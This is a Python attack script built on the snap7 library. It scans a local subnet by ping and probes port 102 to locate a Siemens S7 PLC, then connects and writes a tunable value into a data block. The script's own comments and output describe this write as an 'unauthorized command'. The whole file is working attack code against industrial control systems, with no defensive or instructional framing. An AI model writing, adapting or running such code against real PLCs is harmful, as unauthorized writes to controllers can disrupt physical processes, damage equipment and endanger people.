import snap7
import struct
import time
import socket
import subprocess

# Configuration - Adjust these based on your specific setup
TARGET_PLC_IP = None  # Initially None, we'll try to discover it
PLC_RACK = 0
PLC_SLOT = 1
DB_NUMBER = 1  # Example: Datablock number to target
START_ADDRESS = 0 # Example: Starting address in the Datablock
DATA_SIZE = 4     # Example: Number of bytes to write (e.g., an integer)
COMMAND_VALUE = 100 # Example:  The unauthorized command value to write.  This is *critical* to tune.

# --- PLC IP Discovery (if TARGET_PLC_IP is None) ---
def discover_plc_ip():
    """Attempts to discover the PLC's IP address on the network.
    This is a rudimentary approach and might not work in all network configurations.
    It relies on pinging a common subnet range and checking for responses.
    """
    print("Attempting to discover PLC IP...")
    subnet = "192.168.1." # Adjust this to match your network subnet
    for i in range(1, 255): # Iterate through possible IP addresses
        ip_address = f"{subnet}{i}"
        try:
            # Use subprocess to execute ping command (safer than os.system)
            result = subprocess.run(["ping", "-n", "1", ip_address], # -n 1 for a single ping attempt
                                  capture_output=True, text=True, timeout=2)  # Timeout after 2 seconds
            if "TTL=" in result.stdout:  # Check for successful ping response
                print(f"Possible PLC IP found: {ip_address}")
                # Perform a quick check for an open port (e.g., port 102, often used by S7 PLCs)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1) # Reduced timeout for faster scanning.
                try:
                    sock.connect((ip_address, 102))  # Try to connect to port 102
                    print(f"Port 102 open on {ip_address}. Likely a PLC.")
                    return ip_address
                except (socket.timeout, ConnectionRefusedError):
                    print(f"Port 102 not open on {ip_address}")
                finally:
                    sock.close()

        except subprocess.TimeoutExpired:
            print(f"Ping timeout for {ip_address}")
        except Exception as e:
            print(f"Error pinging {ip_address}: {e}")
            # Consider adding more robust error handling (e.g., logging)

    print("PLC IP address not automatically discovered.  Check your network and subnet.")
    return None



# --- Main Logic ---

if TARGET_PLC_IP is None:
    TARGET_PLC_IP = discover_plc_ip()

    if TARGET_PLC_IP is None:
        print("PLC IP address discovery failed. Please manually set TARGET_PLC_IP.")
        exit(1) # Exit if we can't find the IP

print(f"Using PLC IP: {TARGET_PLC_IP}")


try:
    plc = snap7.client.Client()
    plc.connect(TARGET_PLC_IP, PLC_RACK, PLC_SLOT)

    # Craft the command message
    # This example writes an integer to a datablock.  Adjust as needed for your specific PLC and command format
    data = bytearray(struct.pack(">i", COMMAND_VALUE))  # Pack as big-endian integer

    # Write the data to the PLC.  This is where the "unauthorized command" happens.
    plc.db_write(DB_NUMBER, START_ADDRESS, data)

    print(f"Successfully sent unauthorized command (value: {COMMAND_VALUE}) to PLC DB{DB_NUMBER} at address {START_ADDRESS}")

except snap7.exceptions.Snap7Exception as e:
    print(f"Error communicating with the PLC: {e}")
except Exception as e:
    print(f"An unexpected error occurred: {e}")
finally:
    if 'plc' in locals() and plc.get_connected():
        plc.disconnect()
        print("Disconnected from PLC.")